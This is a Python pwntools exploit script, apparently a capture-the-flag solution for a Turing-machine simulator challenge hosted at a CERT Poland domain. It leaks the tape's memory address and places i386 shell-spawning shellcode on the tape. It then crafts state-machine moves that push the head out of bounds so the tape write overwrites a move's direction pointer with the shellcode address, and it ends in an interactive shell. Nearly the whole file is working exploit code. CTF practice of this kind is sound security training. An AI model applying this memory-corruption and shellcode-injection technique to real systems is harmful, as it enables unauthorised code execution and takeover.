from pwn import *
from sys import argv


MAX_TAPE_SIZE = 10000
MAX_MOVES_COUNT = 10000

class Move:
    def __init__(self, from_tape, from_state, to_tape, to_state, to_right):
        self.from_tape = from_tape
        self.from_state = from_state
        self.to_tape = to_tape
        self.to_state = to_state
        self.to_right = to_right

    def to_bytes(self):
        return b' '.join([
            i2b(self.from_tape), 
            i2b(self.from_state),
            i2b(self.to_tape),
            i2b(self.to_state),
            i2b(self.to_right)])
    
    


def i2b(i):
    return str(i).encode()


def declare(moves, tape, acc_state):
    # Declare how many moves we want to provide, how long the tape gonna be and the accept state.
    declaration = b' '.join([i2b(len(moves)), i2b(len(tape)), i2b(acc_state)])
    p.sendlineafter(b'Input ', declaration)

    # Send moves.
    for m in moves:
        p.sendline(m.to_bytes())

    # Send tape characters.
    p.sendline(b' '.join([i2b(t) for t in tape]))


def get_take_addr():
    p.recvuntil(b'[D] Allocated memory at ')
    tape_addr = int(p.recvline()[:-1], 16)
    return tape_addr


def all_posibilities(from_state):
    moves = []
    for t in range(256):
        moves.append(Move(t, from_state, t, from_state + 1, 1))
    return moves



###############################################################################
## Initialization
###############################################################################
if len(argv) == 2 and argv[1] == 'remote':
    p = remote('ecsc19.hack.cert.pl', 25012)
else:
    p = process('./main')

if len(argv) == 2 and argv[1] == 'debug':
    gdb.attach(p)

tape_addr = get_take_addr()
log.info(f"tape_addr: {hex(tape_addr)}")
moves_addr = tape_addr + MAX_TAPE_SIZE
log.info(f"moves_addr: {hex(moves_addr)}")



###############################################################################
## Exploit
###############################################################################
# Manipulate head_position so that assigment:
#
#     tape[*head_position] = moves[i].to_tape;
#
# overwrites the direction field of one of the moves to point to shellcode
# placed at tape.
###############################################################################

# Inject shellcode at the beginning of the tape.
shellcode = asm(shellcraft.i386.linux.dupsh(), arch='i386')
tape = [0 for _ in range(MAX_TAPE_SIZE)]
for i, b in enumerate(shellcode):
    tape[i] = b

assert 0x51 not in shellcode

moves = [Move(0x51, 0x51, 0x51, 0x51, 1), 
         Move(0x51, 0x43, 0x43, 0x43, 1), # Dummy field. Never execute. Needed only for from_tape field value 
        ]

# Add moves to move head pointer to position 10000.
for b in shellcode:
    moves.append(Move(b, 0, b, 0, 1))
moves.append(Move(0, 0, 0, 0, 1))


# Add moves to skip throught moves[0].from_tape
moves.append(Move(0x51, 0, 0x51, 2, 1))
moves += all_posibilities(2)
moves += all_posibilities(3)
moves += all_posibilities(4)
# Add moves to skip through moves[0].from_state
moves += [Move(0x51, 5, 0x51, 6, 1), Move(0, 6, 0, 7, 1), Move(0, 7, 0, 8, 1), Move(0, 8, 0, 9, 1)]
# Add moves to skip through moves[0].to_tape
moves.append(Move(0x51, 9, 0x51, 10, 1))
moves += all_posibilities(10)
moves += all_posibilities(11)
moves += all_posibilities(12)
# Add moves to skip through moves[0].to_state
moves +=[Move(0x51, 13, 0x51, 14, 1), Move(0, 14, 0, 15, 1), Move(0, 15, 0, 16, 1), Move(0, 16, 0, 17, 1)]

# Now we want to overwrite 4 bytes of direction. Unfortunately we don't know
# the `right` address and so we need all 256 posibilities for each byte.
# We have injected shellcode at the begining of the tape.
shellcode_addr = p32(tape_addr)
for i in range(len(shellcode_addr)):
    for t in range(256):
        if i == len(shellcode_addr) - 1:
            moves.append(Move(t, 17 + i, shellcode_addr[i], 0x51, 1))
        else:
            moves.append(Move(t, 17 + i, shellcode_addr[i], 17 + i + 1, 1))



declare(moves, tape, -1)

# print(p.recvall())
p.interactive()
